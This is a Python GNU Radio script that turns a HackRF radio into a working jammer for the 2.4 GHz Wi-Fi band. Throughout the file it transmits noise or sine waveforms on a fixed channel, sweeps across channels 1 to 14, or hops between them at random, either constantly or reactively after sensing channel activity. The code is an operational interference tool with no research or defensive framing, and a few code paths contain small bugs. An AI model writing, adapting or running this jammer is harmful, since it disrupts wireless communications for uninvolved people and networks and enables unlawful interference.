#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#
# SPDX-License-Identifier: GPL-3.0
#
# GNU Radio Python Flow Graph
# Title: Not titled yet
# Author: abubakar
# GNU Radio version: 3.8.1.0

###################################################################################
# Importing Libraries
###################################################################################

import time
from gnuradio import gr
from gnuradio import blocks
from gnuradio import analog
from gnuradio import audio
from gnuradio import fft
from gnuradio.fft import window
from gnuradio import filter
from gnuradio.filter import firdes
from statistics import mean
import osmosdr
import sys
import numpy as np
from random import randint

###################################################################################
# Sensing Channel Activity Function
###################################################################################

def sense(freq, delay):
    #print("Sense has received the call")
    ###############################################################################
    # Variables
    ###############################################################################

    samp_rate = 20e6		# Delay before hopping to the next channel in sec
    sdr_bandwidth = 20e6	# Hackrf SDR Bandwidth

    tb = gr.top_block()

    ###############################################################################
    # Blocks
    ###############################################################################

    # Source block
    osmosdr_source = osmosdr.source(
            args="numchan=" + str(1) + " " + ""
    )
    osmosdr_source.set_time_unknown_pps(osmosdr.time_spec_t())
    osmosdr_source.set_sample_rate(samp_rate)
    osmosdr_source.set_center_freq(freq, 0)
    osmosdr_source.set_freq_corr(0, 0)
    osmosdr_source.set_gain(0, 0)
    osmosdr_source.set_if_gain(16, 0)
    osmosdr_source.set_bb_gain(16, 0)
    osmosdr_source.set_antenna('', 0)
    osmosdr_source.set_bandwidth(sdr_bandwidth, 0)

    # Inbetween blocks
    low_pass_filter = filter.fir_filter_ccf(
        1,
        firdes.low_pass(
            1,
            samp_rate,
            75e3,
            25e3,
            firdes.WIN_HAMMING,
            6.76))
    complex_to_mag_squared = blocks.complex_to_mag_squared(1)

    # Sink block
    file_sink = blocks.file_sink(gr.sizeof_float*1, 'output.bin', False)
    file_sink.set_unbuffered(True)

    ##############################################################################
    # Connecting Blocks
    ##############################################################################

    tb.connect(osmosdr_source, low_pass_filter)
    tb.connect(low_pass_filter, complex_to_mag_squared)
    tb.connect(complex_to_mag_squared, file_sink)

    tb.start()
    time.sleep(delay)
    tb.stop()
    tb.wait()

###################################################################################
# Jamming Channel Function
###################################################################################

def jam(freq, waveform, power, delay=1):

    ###############################################################################
    # Variables
    ###############################################################################

    samp_rate = 20e6		            # Sample Rate
    sdr_bandwidth = 20e6	            # Hackrf SDR Bandwidth
    RF_gain, IF_gain = set_gains(power)	# Hackrf SDR antenna gain

    tb = gr.top_block()

    ##############################################################################
    # waveform selection
    ##############################################################################

    if waveform == 1:
        source = analog.sig_source_c(samp_rate, analog.GR_SIN_WAVE, 1000, 1, 0, 0)
    elif waveform == 2:
        source = analog.sig_source_f(samp_rate, analog.GR_SIN_WAVE, 1000, 1, 0, 0)
    elif waveform == 3:
        source = analog.noise_source_c(analog.GR_GAUSSIAN, 1, 0.5)
    else:
        print("invalid selection")

    #############################################################################
    # Hackrf Trasmitter options
    #############################################################################

    freq_mod = analog.frequency_modulator_fc(1)
    osmosdr_sink = osmosdr.sink(
        args="numchan=" + str(1) + " " + ""
    )
    osmosdr_sink.set_time_unknown_pps(osmosdr.time_spec_t())
    osmosdr_sink.set_sample_rate(samp_rate)
    osmosdr_sink.set_center_freq(freq, 0)
    osmosdr_sink.set_freq_corr(0, 0)
    osmosdr_sink.set_gain(RF_gain, 0)
    osmosdr_sink.set_if_gain(IF_gain, 0)
    osmosdr_sink.set_bb_gain(20, 0)
    osmosdr_sink.set_antenna('', 0)
    osmosdr_sink.set_bandwidth(sdr_bandwidth, 0)

    ##############################################################################
    # Connecting Blocks
    ##############################################################################

    if waveform == 2:
        tb.connect(source, freq_mod, osmosdr_sink)
    else:
        tb.connect(source, osmosdr_sink)

    tb.start()
    time.sleep(delay)
    tb.stop()
    tb.wait()

##################################################################################
# Set Frequency
##################################################################################

def set_frequency(channel, ch_dist):
    if channel == 1:
        freq = init_freq
    else:
        freq = init_freq + (channel - 1) * ch_dist

    print(f"the freq is: {freq}")
    return freq

##################################################################################
# Set RF Gains
##################################################################################

def set_gains(power):
    if power >= -40 and power <= 5:
        RF_gain = 0
        if power < -5:
            IF_gain = power + 40
        elif power >= -5 and power <= 2:
            IF_gain = power + 41
        elif power > 2 and power <= 5:
            IF_gain = power + 42
    elif power > 5:
        RF_gain = 14
        IF_gain = power + 34
    else:
        print("invalid Jammer Transmit power")

    return RF_gain, IF_gain

##################################################################################
# Detect Activity Function
##################################################################################

def detect():
    #print("Inside detect function")
    with open("output.bin", mode = 'rb') as file:
        fileContent = file.read()
        samples = np.memmap("output.bin", mode = "r", dtype = np.float32)

    p = 0.5 * mean(samples)
    return p

##################################################################################
# Main Function
##################################################################################

if __name__ == "__main__":
    init_freq = 2.412e9		# Channel 1 Center Frequency
    lst_freq = 2.484e9		# Channel 14 Center Frequency
    jammer = 2 #int(input("Select Jammer Type (1=constant, 2=sweeping, 3=random channel hopping): "))
    jamming = 1 #int(input("Select Type of Jamming (1=proative, 2=reactive): "))
    waveform = 3#int(input("Select Jamming waveform (1=modulated sine, 2=swept sine, 3=gaussian noise): " ))
    power = 6# int(input("Enter Jammer transmit power in dBm (Min = -40dBm, Max = 13dBm): "))
    t_jamming = 1#int(input("Enter channel jamming duration in sec: "))
    if jamming == 2:
        t_sensing = 0.05# int(input("Enter channel sensing Duration in sec: "))
    ch_dist = int(input("Enter center frequency hopping width in MHz (Min = 1MHz, Max = 20MHz): ")) * 10e5			# Channel hopping
    n_channels = (lst_freq - init_freq)//ch_dist
    threshold = 0.0002

    if jammer == 1:
        if jamming == 1:
            freq = int(input("Enter the frequency to Jam in MHz: ")) * 10e5
            jam(freq, waveform, power, t_jamming)
        elif jamming == 2:
            # Sensing Channel
            sense(freq, t_sensing)
            rx_power = detect()
            # If channel is active then jam it
            if rx_power > threshold:
                jam(freq, waveform, power, t_jamming)
            #else:
                #print(f"no ativity on freq {freq}")
        else:
            print("Invalid jamming option selection")

    elif jammer == 2:
        channel = 1         # Initial Channel @ 2.412GHz
        while True:
            freq = set_frequency(channel, ch_dist)
            if jamming == 1:
                # Jam
                jam(freq, waveform, power, t_jamming)
            elif jamming == 2:
                # Sensing Channel
                #print("I will call sense now")
                sense(freq, t_sensing)
                #print("I will get rx_power now")
                rx_power = detect()
                #print(f"received power is {rx_power}")
    			# If channel is active then jam it
                if rx_power > threshold:
                    jam(freq, waveform, power, t_jamming)
                #else:
                    #print(f"no ativity on freq {freq}")
            else:
                print("Invalid jamming option selection")
            # Go to next channel
            channel = 1 if channel > n_channels else channel + 1

    elif jammer == 3:
        while True:
            channel = randint(1, n_channels + 1)
            freq = set_frequency(channel, ch_dist)
            if jamming == 1:
                # Jam
                jam(freq, waveform, power, t_jamming)
            elif jamming == 2:
                # Sensing Channel
                sense(freq, t_sensing)
                rx_power = detect()
    			# If channel is active then jam it
                if rx_power > threshold:
                    jam(freq, waveform, power, t_jamming)
                #else:
                    #print(f"no ativity on freq {freq}")
            else:
                print("Invalid jamming option selection")
    else:
        print("invalid jammer selection")
